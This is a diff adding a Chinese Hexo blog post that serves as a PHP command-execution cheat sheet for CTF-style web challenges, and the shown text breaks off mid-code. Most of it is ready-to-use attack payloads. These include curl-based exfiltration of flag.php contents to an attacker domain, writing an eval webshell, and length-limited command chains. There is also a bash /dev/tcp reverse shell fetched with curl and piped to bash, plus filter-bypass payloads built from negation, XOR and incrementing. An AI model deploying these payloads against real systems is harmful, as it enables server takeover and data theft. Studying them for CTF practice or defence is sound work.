@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        代码&命令执行 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">代码&命令执行</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/php%E5%AE%89%E5%85%A8/" class="post-tag">#php安全</a>
+  
+
+
+          <span class="post-date">2023-04-06</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81-amp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">代码&amp;命令执行函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">无回显命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD"><span class="toc-text">判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%8B%BFflag"><span class="toc-text">直接拿flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BFshell"><span class="toc-text">拿shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%90%91shell"><span class="toc-text">正向shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce"><span class="toc-text">无字母数字rce</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-text">取反</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-text">异或</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-text">自增</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-text">命令执行绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5"><span class="toc-text">拼接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81"><span class="toc-text">base64编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-text">单引号、双引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E7%BA%BF"><span class="toc-text">反斜线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IFS"><span class="toc-text">${IFS}</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6-lt-gt"><span class="toc-text">重定向符&lt;&gt;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84%E8%B5%84%E6%BA%90"><span class="toc-text">利用已存在的资源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6-amp-%E5%91%BD%E4%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-text">管道符&amp;命令分隔符</span></a></li></ol></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h1 id="代码-amp-命令执行函数"><a href="#代码-amp-命令执行函数" class="headerlink" title="代码&amp;命令执行函数"></a>代码&amp;命令执行函数</h1><blockquote>
+<p> 可以代码&amp;命令执行的函数有很多，有可以回显的，也有不回显的。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">说明</th>
+<th align="center">例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">string system($command[,int $return_var])</td>
+<td align="center">command是要执行的命令，如果提供return参数，则外部命令执行后的返回状态将会被设置到此变量中，显示输出。</td>
+<td align="center"><code>system(&#39;whoami&#39;)</code></td>
+</tr>
+<tr>
+<td align="center">void passthru($command[,int $return_var])</td>
+<td align="center">执行外部程序并且显示原始输出。</td>
+<td align="center"><code>passthru(&#39;whoami&#39;)</code></td>
+</tr>
+<tr>
+<td align="center">string exec(string $command[,array $output[,int $return_var]])</td>
+<td align="center">执行指定的命令，并返回结果的最后一行内容，==不显示输出==</td>
+<td align="center"><code>echo exec(&#39;whoami&#39;)</code></td>
+</tr>
+<tr>
+<td align="center">string shell_exec(string $cmd)</td>
+<td align="center">通过shell环境执行命令，并且将完整的输出以字符串的方式返回。</td>
+<td align="center"><code>echo shell_exec(&#39;whoami&#39;)</code></td>
+</tr>
+<tr>
+<td align="center">void pcntl_exec(string  $path[,array $args[,array $envs]])</td>
+<td align="center">path是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本。args是一个要传递给程序的参数的字符串数组。该模块不能在非unix平台（win）上运行。</td>
+<td align="center"><code>pcntl_exec(&quot;/bin/cat&quot;,array(&quot;etc/passwd&quot;));</code></td>
+</tr>
+<tr>
+<td align="center">resource popen(string $command,string $mode)</td>
+<td align="center">打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。后面的mode，当为r，返回的文件指针等于命令的STDOUT，当为w，返回的文件指针等于命令的STDIN。</td>
+<td align="center"><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271442975.png" alt="image-20230327144229397"></td>
+</tr>
+<tr>
+<td align="center">反引号</td>
+<td align="center"></td>
+<td align="center">echo `whoami`;</td>
+</tr>
+<tr>
+<td align="center">string create_function()</td>
+<td align="center">php中使用create_function()创建一个匿名函数，如果对参数未进行严格的过滤审查，攻击者可以通过提交特殊字符串给create_function()从而导致任意代码执行。</td>
+<td align="center"><code>create_function(&#39;$test&#39;,&#39;&#125;;phpinfo();/*&#39;);</code></td>
+</tr>
+<tr>
+<td align="center">array array_map(callable $callback,array $array1[,array $…])</td>
+<td align="center">为数组的每个元素应用回调函数。其返回值为数组，是为array1每个元素应用callback函数之后的数组。callback 函数形参的数量和传给array_map()数组数量，两者必须一样。</td>
+<td align="center"><code>array_map(&#39;system&#39;,array(&#39;whoami&#39;));</code></td>
+</tr>
+<tr>
+<td align="center">array array_filter(array $array[,callable $callback[,int $flag=0]])</td>
+<td align="center">依次将array数组中的每个值传递到callback 函数。如果callback 函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</td>
+<td align="center"><code>array_filter(array(&#39;whoami&#39;),&#39;system&#39;);</code></td>
+</tr>
+<tr>
+<td align="center">bool usort(array  $array,callable $value_compare_func)</td>
+<td align="center">通过用户自定义的比较函数对数组进行排序。</td>
+<td align="center"><code>$a=array(&#39;whoami&#39;,&#39;t);usort($a,&quot;system&quot;);</code></td>
+</tr>
+<tr>
+<td align="center">bool uasort(array $array,callable $value_compare_func)</td>
+<td align="center">使用用户自定义的比较函数对数组中的值进行排序并保持索引关联。</td>
+<td align="center"><code>$a=array(&#39;whoami&#39;,&#39;t&#39;);uasort($a,&quot;system&quot;);</code></td>
+</tr>
+</tbody></table>
+<h1 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h1><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(issert(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        shell_exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li><p>延时</p>
+<p>?cmd=sleep 3</p>
+<p>通过是否延时来判断命令是否已经执行，有延时则表示命令有执行</p>
+</li>
+<li><p>HTTP请求</p>
+<p>在公网服务器监听端口</p>
+<p>nc -lvp 4444</p>
+<p>向目标服务器发起http请求，执行curl命令</p>
+<p>?cmd=curl ip:4444</p>
+</li>
+<li><p>DNS请求</p>
+<p>dnslog</p>
+<p>?cmd=ping 9y8y3k.dnslog.cn</p>
+</li>
+</ol>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="直接拿flag"><a href="#直接拿flag" class="headerlink" title="直接拿flag"></a>直接拿flag</h3><ol>
+<li><p>使用<code>&gt;</code>或<code>&gt;&gt;</code></p>
+<blockquote>
+<p>?cmd=cat flag.php&gt;flag.txt</p>
+</blockquote>
+</li>
+<li><p><code>mv</code> 或 <code>cp</code></p>
+<blockquote>
+<p>?cmd=mv flag.php flag.txt</p>
+<p>?cmd=cp flag.php flag.txt?cmd=mv flag.php flag.txt</p>
+<p>?cmd=cp flag.php flag.txt</p>
+</blockquote>
+</li>
+<li><p>打包压缩</p>
+<blockquote>
+<p><code>tar</code></p>
+<p>tar cvf flag.tar flag.php</p>
+<p>tar zcvf flag.tar.gz flag.php</p>
+<p><code>zip</code></p>
+<p>zip flag.zip flag.php</p>
+</blockquote>
+</li>
+<li><p><code>cut and sleep</code></p>
+<blockquote>
+<p>sed指定读取文件的第几行</p>
+<p>cat flag.php|sed -n ‘2p’</p>
+<p>提取每一行的第三个字节</p>
+<p>cut -b 3 flag文件</p>
+<p>最后</p>
+<p>cat flag.php|sed -n ‘2p’|cut -b 1</p>
+</blockquote>
+</li>
+<li><p><code>curl</code>外带数据</p>
+<blockquote>
+<p>用&lt;替换读取文件中的空格，且对输出结果base64编码</p>
+<p>curl `cat&lt;flag.php|base64`</p>
+<p>再拼接上要请求的vps</p>
+<p>curl `cat&lt;flag.php|base64`.xxxx.com</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h3><h4 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h4><h5 id="无字符数量限制"><a href="#无字符数量限制" class="headerlink" title="无字符数量限制"></a>无字符数量限制</h5><ul>
+<li><p>直接写入</p>
+<blockquote>
+<p>?cmd=echo “<?php @eval(\\$_POST[1]);?>“ &gt; webshell.php</p>
+</blockquote>
+</li>
+<li><p>外部下载</p>
+<blockquote>
+<p>wget 网址 -O webshell.php   #使用wget下载shell,使用参数-O来指定一个文件名</p>
+</blockquote>
+</li>
+</ul>
+<h5 id="有限字符限制"><a href="#有限字符限制" class="headerlink" title="有限字符限制"></a>有限字符限制</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">15</span>)&#123;</span><br><span class="line">    shell_exec(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="14位可控"><a href="#14位可控" class="headerlink" title="14位可控"></a>14位可控</h6><blockquote>
+<p>echo \&lt;?php&gt;1</p>
+<p>echo eval\(&gt;&gt;1</p>
+<p>echo \$_GET&gt;&gt;1</p>
+<p>echo \[1\]&gt;&gt;1</p>
+<p>echo \)\;&gt;&gt;1</p>
+<p>mv 1 1.php</p>
+</blockquote>
+<h6 id="7位可控"><a href="#7位可控" class="headerlink" title="7位可控"></a>7位可控</h6><p>知识点</p>
+<blockquote>
+<ul>
+<li>&gt; a 虽然没有输入但是会创建a文件</li>
+<li>ls -t  ls基于时间排序（从晚到早)</li>
+<li>sh a   把a里面的每行内容当作命令来执行</li>
+<li>使用\进行命令拼接     l\s=ls</li>
+<li>使用base64编码笔迷案特殊字符</li>
+</ul>
+</blockquote>
+<p>目标：写入语句 &lt;?php eval($_GET[1]);</p>
+<p>base64编码后  PD9waHAgZXZhbCgkX0dFVFsxXSk7</p>
+<p>需要被执行的语句是 echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\-\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh0</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h5 id="5位可控"><a href="#5位可控" class="headerlink" title="5位可控"></a>5位可控</h5><p>知识点</p>
+<ol>
+<li><p>输入通配符*，linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p>
+</li>
+<li><p>通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出）</p>
+</li>
+<li><p>用dir来替代ls不换行输出；rev将文件内容反向输出；在用ls时，写到a时每个文件名都是单独一行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line">echo 1234&gt;v</span><br><span class="line">*v 等同于命令rev v</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</p>
+<p>那么我们只需要将上面的代码拆分倒叙输入到主机即可。我们需要让sh先执行a文件(ls -th&gt;f)就会得到f文件，最后再让sh去执行f文件即可得到1.php。</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271606718.png" alt="image-20230327160653643"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><blockquote>
+<ol>
+<li><p>公网服务器开启监听</p>
+<p>nc -lvp 4444 或  nc -vv -lp 4444</p>
+</li>
+<li><p>在公网服务器写一个文件（qwzf文件)，内容是下面的命令</p>
+<p>bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1</p>
+</li>
+<li><p>浏览器执行payload</p>
+<p>?cmd=curl x.x.x.x:8002/qwzf|bash</p>
+</li>
+</ol>
+</blockquote>
+<h1 id="无字母数字rce"><a href="#无字母数字rce" class="headerlink" title="无字母数字rce"></a>无字母数字rce</h1><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>如图示，对phpinfo取反，再取反，仍然得到phpinfo，但是可以利用它进行一些对数字字母过滤的绕过</p>
+<p>paylaod: (~%8F%97%8F%96%91%99%90)();</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;666&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=urlencode(~<span class="string">&#x27;eval($_POST[1]);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
+
+<p>shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_=~%9E%8C%8C%9A%8D%8B;$__=~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4;$_($__);</span><br></pre></td></tr></table></figure>
+
+<p>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。</p>
+<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCI值，再转换成字符串。</p>
+<p>这里有一个异或构造的脚本, 相信聪明的你一看就知道怎么回事了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class="line"></span><br><span class="line">answer = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入进行异或构造的字符串：&quot;</span>))</span><br><span class="line"></span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">        tmp1 += i</span><br><span class="line">        tmp2 += j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tmp1为:&quot;</span>,tmp1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tmp2为:&quot;</span>,tmp2)</span><br></pre></td></tr></table></figure>
+
+<p>那么怎么利用呢？</p>
+<p>下面是几个例子</p>
+<p>需要注意的是，由于我们的Payload中含有一些特殊字符，我们传参的时候需要对Payload进行一次URL编码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);  //变量$__值为字符串&#x27;_POST&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mess=$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);&amp;_=print_r(show_source(&#x27;p.php&#x27;));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;   <span class="comment">//构造出assert</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;   <span class="comment">//构造出_POST</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>;   <span class="comment">//$___ = $_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);   <span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%A0=命令或函数  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;&#125;[&#x27;+&#x27;]();&amp;+=命令   //$_GET[+]</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>个人认为拿到自增的初始值是自增rce最精髓的部分之一</p>
+<ul>
+<li><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为”Array”。再取这个字符串的第一个字母，就可以获得”==A==”。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line">var_dump(<span class="variable">$a</span>); <span class="comment">//Array</span></span><br></pre></td></tr></table></figure></li>
+<li><p>$++对变量进行了自增操作,由于我们没有定义的值,PHP会给赋一个默认值NULL==0,由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line">var_dump(<span class="variable">$_</span>);  <span class="comment">//1</span></span><br></pre></td></tr></table></figure></li>
+<li><p>$__没有定义，默认为Null也即==0==</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="variable">$__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>那++$__就是==1==</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(++<span class="variable">$__</span>);</span><br></pre></td></tr></table></figure></li>
+<li><p>==NAN==</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ((_/_).<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>==N==</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ((_/_).<span class="string">&#x27;&#x27;</span>)&#123;<span class="variable">$_</span>&#125;;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>payload</p>
+<p>初始</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;   <span class="comment">//得到&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>];   <span class="comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>;   <span class="comment">//$_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;AS&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span 